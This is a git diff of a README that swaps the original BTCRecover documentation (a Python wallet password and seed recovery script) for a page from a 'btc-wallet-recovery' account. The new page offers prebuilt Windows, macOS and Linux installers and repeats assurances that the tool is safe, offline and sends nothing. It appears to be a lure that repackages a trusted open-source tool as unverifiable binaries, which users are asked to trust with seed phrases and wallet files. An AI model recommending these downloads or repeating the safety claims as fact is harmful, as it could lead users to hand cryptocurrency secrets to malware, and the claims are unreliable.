@@ -1,151 +1,102 @@
-# BTCRecover #Crypto Retriever
+<div align="center">
+<img src="assets/banner-app.png" alt="BTC Recovery engine">
+</div>
 
-# L_lurk Notes
-You need to install some dependancies to get it to work. It isn't obvious what you need to do so I will include that here:
+<h1 align="center">BTC Recovery engine</h1>
 
-pip install pycryptodome
+<p align="center">The BTCRecover codebase this application is built on, under GPL-2.0.</p>
 
-This worked for me with python 3.17
-Donations at the bottom go to me :)
+<div align="center">
+<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
+</div>
 
+<div align="center">
+<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
+</div>
 
-[![Last Push - All Tests (Base Modules)](https://github.com/3rdIteration/btcrecover/workflows/Last%20Push%20-%20All%20Tests%20(Base%20Modules)/badge.svg)](https://github.com/3rdIteration/btcrecover/actions?query=workflow%3A%22Last+Push+-+All+Tests+%28Base+Modules%29%22) [![Weekly - All Tests (Base Modules)](https://github.com/3rdIteration/btcrecover/workflows/Weekly%20-%20All%20Tests%20(Base%20Modules)/badge.svg)](https://github.com/3rdIteration/btcrecover/actions?query=workflow%3A%22Weekly+-+All+Tests+%28Base+Modules%29%22) [![Weekly Run All Tests (Base Modules)](https://github.com/3rdIteration/btcrecover/workflows/Weekly%20-%20All%20Tests%20(+Optional%20Modules)//badge.svg)](https://github.com/3rdIteration/btcrecover/actions?query=workflow%3A%22Weekly+-+All+Tests+%28%2BOptional+Modules%29%22) [![Documentation Status](https://readthedocs.org/projects/btcrecover/badge/?version=latest)](https://btcrecover.readthedocs.io/en/latest/?badge=latest) ![license](https://img.shields.io/badge/license-GPLv2-blue.svg) 
+<div align="center">
 
-*BTCRecover* is an open source wallet password and seed recovery tool.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
+| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
+| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |
 
-For seed based recovery, this is primarily useful in situations where you have lost/forgotten parts of your mnemonic, or have made an error transcribing it. (So you are either seeing an empty wallet or getting an error that your seed is invalid)
+</div>
 
-For wallet password or passphrase recovery, it is primarily useful if you have a reasonable idea about what your password might be.
+The source behind the published build is readable before you run it.
 
-# Documentation:
-### Instructions for installation, usage & examples:  [https://btcrecover.readthedocs.io/](https://btcrecover.readthedocs.io/)
+> Only download from this GitHub release page.
 
-[(You can also view the documentation in your browser locally by following the instructions here. )](docs/local_mkdocs.md)
+## What this repository is for
 
-If you need help, [your best bet is to look at my BTCRecover playlist on YouTube]. (https://youtu.be/n6vc5f2UqVA) and ask a question in the comments section for any of video closest to your situation.
+BTC Recovery is built on BTCRecover, the long-running open-source wallet recovery tool, and this repository holds the engine source that the application is compiled from. The licence is GPL-2.0, the same as the application, so everything the installed program does can be read here before it is trusted with a wallet file. Keeping the engine in its own repository is deliberate: the application repository publishes releases and installers, and this one holds the code those releases are built from. If you are deciding whether to trust a recovery tool with a phrase or a password, reading the engine is the strongest check available, and the safety guide explains the others. The engine's own tests and history stay with it, which is also why a reader comparing the installer with the source can see exactly what changed between builds.
 
-## Features ##
-* BIP39 Seed/Passphrase Recovery when for: (Recovery without a known address requires an [Address Database](docs/Creating_and_Using_AddressDB.md))
-    * Avalanche
-    * Bitcoin
-    * Bitcoin Cash
-    * Cardano (Shelley Era Addresses)
-    * Cosmos (Atom) Any many other Cosmos Chains (Nym, GravityBridge, etc)
-    * Dash
-    * DigiByte
-    * Dogecoin
-    * Ethereum
-    * Groestlcoin
-    * Helium
-    * Litecoin
-    * Monacoin
-    * Polkadot (sr25519, like those produced by polkadot.js)
-    * Ripple
-    * Secret Network
-    * Solana
-    * Stacks
-    * Stellar
-    * Tezos
-    * Tron
-    * Vertcoin
-    * Zilliqa
-    * And many other 'Bitcoin Like' cryptos
- * SLIP39 Passphrase Recovery for most coins supported by the Trezor T
-    * Bitcoin
-    * Bitcoin Cash
-    * Dash
-    * Digibyte
-    * Dogecoin
-    * Ethereum
-    * Litecoin
-    * Ripple
-    * Vertcoin
- * [Descrambling 12 word seeds](docs/BIP39_descrambling_seedlists.md) (Using Tokenlist feature for BIP39 seeds via seedrecover.py)
- * Wallet File password recovery for a range of wallets
+## Who it is for
 
-* Seed Phrase (Mnemonic) Recovery for the following wallets
-     * [Electrum](https://electrum.org/) (1.x, 2.x, 3.x and 4.x) (For Legacy and Segwit Wallets. Set --bip32-path "m/0'/0" for a Segwit wallet, leave bip32-path blank for Legacy... No support for 2fa wallets...)
-     * [Electron-Cash](https://www.electroncash.org/) (2.x, 3.x and 4.x)
-     * BIP-32/39 compliant wallets ([bitcoinj](https://bitcoinj.github.io/)), including:
-         * [MultiBit HD](https://multibit.org/)
-         * [Bitcoin Wallet for Android/BlackBerry](https://play.google.com/store/apps/details?id=de.schildbach.wallet) (with seeds previously extracted by [decrypt\_bitcoinj\_seeds](https://github.com/gurnec/decrypt_bitcoinj_seed))
-         * [Hive for Android](https://play.google.com/store/apps/details?id=com.hivewallet.hive.cordova), [for iOS](https://github.com/hivewallet/hive-ios), and [Hive Web](https://hivewallet.com/)
-         * [Breadwallet](https://brd.com/)
-     * BIP-32/39/44 Bitcoin & Ethereum compliant wallets, including:
-         * [Mycelium for Android](https://wallet.mycelium.com/)
-         * [TREZOR](https://www.bitcointrezor.com/)
-         * [Ledger](https://www.ledgerwallet.com/)
-         * [Keepkey](https://shapeshift.io/keepkey/)
-         * [ColdCard](https://coldcardwallet.com/)
-         * [Jaxx](https://jaxx.io/)
-         * [Coinomi](https://www.coinomi.com/)
-         * [Exodus](https://www.exodus.io/)
-         * [MyEtherWallet](https://www.myetherwallet.com/)
-         * [Bither](https://bither.net/)
-         * [Blockchain.com](https://blockchain.com/wallet)
- * Bitcoin wallet password recovery support for:
-     * [Bitcoin Core](https://bitcoincore.org/)
-     * [MultiBit HD](https://multibit.org/) and [MultiBit Classic](https://multibit.org/help/v0.5/help_contents.html)
-     * [Electrum](https://electrum.org/) (1.x, 2.x, 3.x and 4.x) (For Legacy and Segwit Wallets. Set --bip32-path "m/0'/0" for a Segwit wallet, leave bip32-path blank for Legacy... No support for 2fa wallets...)
-     * Most wallets based on [bitcoinj](https://bitcoinj.github.io/), including [Hive for OS X](https://github.com/hivewallet/hive-mac/wiki/FAQ)
-     * BIP-39 passphrases (Also supports all cryptos supported for seed recovery, as well as recovering "Extra Words" for Electrum seeds)
-     * [mSIGNA (CoinVault)](https://ciphrex.com/products/)
-     * [Blockchain.com](https://blockchain.com/wallet)
-     * [block.io](https://block.io/) (Recovery of wallet "Secret PIN")
-     * [pywallet --dumpwallet](https://github.com/jackjack-jj/pywallet) of Bitcoin Unlimited/Classic/XT/Core wallets
-     * [Bitcoin Wallet for Android/BlackBerry](https://play.google.com/store/apps/details?id=de.schildbach.wallet) spending PINs and encrypted backups
-     * [KnC Wallet for Android](https://github.com/kncgroup/bitcoin-wallet) encrypted backups
-     * [Bither](https://bither.net/)
-     * [Encrypted (BIP-38) Paper Wallet Support (Eg: From Bitaddress.org)](https://bitaddress.org) Also works with altcoin forks like liteaddress.org, paper.dash.org, etc...
-     * Brainwallets
-        * Sha256(Passphrase) brainwallets (eg: Bitaddress.org, liteaddress.org, paper.dash.org)
-        * sCrypt Secured Brainwallets (Eg: Warpwallet, Memwallet)
- * Altcoin password recovery support for most wallets derived from one of those above, including:
-     * [Coinomi](https://www.coinomi.com/en/) (Only supports password protected wallets)
-     * [Metamask](https://metamask.io/) (And Metamask clones like Binance Chain Wallet, Ronin Wallet, etc.)
-     * [Litecoin Core](https://litecoin.org/)
-     * [Electrum-LTC](https://electrum-ltc.org/) (For Legacy and Segwit Wallets. Set --bip32-path "m/0'/0" for a Segwit wallet, leave bip32-path blank for Legacy... No support for 2fa wallets...)
-     * [Electron-Cash](https://www.electroncash.org/) (2.x, 3.x and 4.x)
-     * [Litecoin Wallet for Android](https://litecoin.org/) encrypted backups
-     * [Dogecoin Core](http://dogecoin.com/)
-     * [MultiDoge](http://multidoge.org/)
-     * [Dogechain.info](https://dogechain.info/)
-     * [Dogecoin Wallet for Android](http://dogecoin.com/) encrypted backups
-     * [Yoroi Wallet for Cardano](https://yoroi-wallet.com/#/) Master_Passwords extracted from the wallet data (In browser or on rooted/jailbroken phones)
-     * [Ethereum UTC Keystore Files](https://myetherwallet.com) Ethereum Keystore files, typically used by wallets like MyEtherWallet, MyCrypto, etc. (Also often used by Eth clones like Theta, etc)
-     * [Damaged Raw Eth Private Keys]() Individual Private keys that are missing characters.
- * [Free and Open Source](http://en.wikipedia.org/wiki/Free_and_open-source_software) - anyone can download, inspect, use, and redistribute this software
- * Supported on Windows, Linux, and OS X
- * Support for Unicode passwords and seeds
- * Multithreaded searches, with user-selectable thread count
- * Ability to spread search workload over multiple devices
- * [GPU acceleration](docs/GPU_Acceleration.md) for Bitcoin Core Passwords, Blockchain.com (Main and Second Password), Electrum Passwords + BIP39 and Electrum Seeds
- * Wildcard expansion for passwords
- * Typo simulation for passwords and seeds
- * Progress bar and ETA display (at the command line)
- * Optional autosave - interrupt and continue password recoveries without losing progress
- * Automated seed recovery with a simple graphical user interface
- * Ability to search multiple derivation paths simultaneously for a given seed via --pathlist command (example pathlist files in the )
- * “Offline” mode for nearly all supported wallets - use one of the [extract scripts (click for more information)](docs/Extract_Scripts.md) to extract just enough information to attempt password recovery, without giving *btcrecover* or whoever runs it access to *any* of the addresses or private keys in your Bitcoin wallet.
+- You want to read the code before running it against a wallet.
+- You are checking whether a wallet format you hold is handled by this engine.
+- You are building the application from source rather than installing it.
 
-## Setup and Usage Tutorials ##
-BTCRecover is a Python (3.7, 3.8, 3.9, 3.10) script so will run on Windows, Linux and Mac environments. [See the installation guide for more info](docs/INSTALL.md)
+## Start here
 
-[I have created a growing playlist](https://youtu.be/n6vc5f2UqVA) that covers a number of usage examples for using this tool to recover seed phrases, BIP39 passphrases, etc.
+- The safety guide explains the checks that matter before a first run.
+- The tool overview names the wallet types the engine targets.
+- The first-run walkthrough covers a single wallet end to end.
 
-This repository also included some example commands and file templates in the ./docs/ folder of the repository.
+## How to use these guides
 
-My suggestion is that you find a scenario that is most-like your situation and try to replicate my examples to ensure that you have the tool set up and running correctly. If you have a specific situation that isn't covered in these tutorials, let me know and I can look into creating a video for that.
+1. Read the licence before redistributing anything built from this source.
+2. Compare the engine's version with the release notes of the installer you downloaded.
+3. Use the guides rather than the source for the option names you need day to day.
 
-If you don't know an address in the wallet that you are searching for, you can create and use an [Address Database (click here for guide)](docs/Creating_and_Using_AddressDB.md) _There is no real performance penalty for doing this, it just takes a bit more work to set up_.
+## The guides, grouped
 
-## Quick Start ##
+Four pages explain what the engine is asked to do.
 
-To try recovering your password or a BIP39 passphrase, please start with the **[Password Recovery Quick Start](docs/TUTORIAL.md#btcrecover-tutorial)**.
+| Guide | What it answers |
+| --- | --- |
+| [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |
+| [Bitcoin wallet recovery tool: what it does and when it works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-bitcoin-wallet-recovery-tool.md) | It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere. |
+| [How to use BTCRecover: first run walkthrough](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/how-to-use-btcrecover.md) | Get those right and the command is short; get one wrong and the run is silent, which is the part that costs people a weekend. |
+| [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) | BTCRecover works on local wallet files and seed phrases of the formats it supports, not on every wallet that exists. |
 
-If you mostly know your recovery seed/mnemonic (12-24 recovery words), but think there may be a mistake in it, please see the **[Seed Recovery Quick Start](docs/Seedrecover_Quick_Start_Guide.md)**.
+## What each guide changes
 
-## If this tool or other content on my YouTube channel was helpful, feel free to send a tip to: ##
+| Your situation | Guide | What you end up with |
+| --- | --- | --- |
+| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
+| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
+| A download you want to check | The tool guides | The published checksum and the file that matches it. |
 
-BTC: bc1q8sk5nnkf3t8tznrn6vyn9sqd9gzpv876zhp6wl
-LTC: ltc1q9wg0rqetyl09yqyxpdplvjl5kllnucc53337es
+## Common first questions
+
+### Is this the same code as the installer?
+
+Yes. The release is built from this engine, and the licence requires that the source stays available.
+
+### Can I use this in my own project?
+
+GPL-2.0 allows it with the same licence and the same source obligations. Read the licence file rather than a summary of it.
+
+### Why publish the source separately from the installer?
+
+Because the licence requires the source to stay available, and because a recovery tool should be readable before it is trusted with a phrase.
+
+## Before you install
+
+Check the licence before you redistribute anything built from this source, and check the release notes before you assume this engine matches the installer you downloaded. The application repository is where the published build lives. Reading the source is the strongest check a reader can make on a tool like this, and the safety guide lists the others in the order that matters.
+
+## About
+
+BTC Recovery ships as a built application, and this repository is the engine it is built from. Separating them keeps the release page about releases and this page about the code, which is what a reader who wants to check the implementation is actually looking for. Read the engine before you hand it a wallet file, because the source is the one claim on this account a reader can check line by line.
+
+## License
+
+The engine keeps the GPL-2.0 licence it came with; [LICENSE](LICENSE) holds the whole text.
+
+---
+
+**BTC Recovery engine** - one page of the BTC Recovery account.
+
+Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
